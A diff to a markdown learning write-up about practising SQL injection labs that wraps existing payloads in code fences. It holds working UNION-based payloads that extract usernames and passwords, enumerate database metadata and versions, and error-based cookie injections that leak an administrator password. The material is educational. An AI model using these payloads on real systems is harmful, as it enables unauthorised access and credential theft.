@@ -38,49 +38,49 @@ After determining the number of columns, I tested which columns were compatible 
 ### Retrieving Data from Other Tables
 
 After identifying the correct columns, I used UNION SELECT to retrieve information from another table.
-
+```SQL
     ' UNION SELECT username,password FROM users--
-
+```
 ## Database Enumeration
 
 I practiced discovering database tables and columns using database metadata.
 
 ### Non-Oracle Databases
-
+```SQL
     ' UNION SELECT table_name,NULL FROM information_schema.tables--
 
     ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
-
+```
 ### Oracle Databases
 
 Oracle uses different database metadata tables.
-
+```SQL
     ' UNION SELECT table_name,NULL FROM all_tables--
 
     ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
-
+```
 Oracle also requires a FROM clause for SELECT statements, so I used the built-in dual table.
-
+```SQL
     ' UNION SELECT 'abc','def' FROM dual--
-
+```
 ## Database Version
 
 I practiced retrieving database version information using database-specific queries.
 
 ### MySQL and Microsoft
-
+```SQL
     ' UNION SELECT @@version,NULL#
-
+```
 ### Oracle
-
+```SQL
     ' UNION SELECT BANNER,NULL FROM v$version--
-
+```
 ## Retrieving Multiple Values
 
 When only one column was compatible with text, I combined multiple database values into a single column.
-
+```SQL
     ' UNION SELECT NULL,username||'~'||password FROM users--
-
+```
 The username and password were returned together with `~` used as a separator.
 
 ## Error-Based SQL Injection
@@ -88,23 +88,23 @@ The username and password were returned together with `~` used as a separator.
 I also practiced SQL injection where the application did not directly display the query results but returned detailed database error messages.
 
 I used the vulnerable `TrackingId` cookie to test the injection.
-
+```HTML
     TrackingId=ogAZZfxtOKUELbuJ'
-
+```
 I then used SQL comments to make the query syntactically valid.
-
+```HTML
     TrackingId=ogAZZfxtOKUELbuJ'--
-
+```
 I used `CAST()` to force database values into an error message.
-
+```HTML
     TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-
+```
 The error message revealed the username `administrator`.
 
 I then modified the query to retrieve the administrator password.
-
+```HTML
     TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-
+```
 The password was leaked through the database error message and was used to log in as the administrator.
 
 ## Key Learning
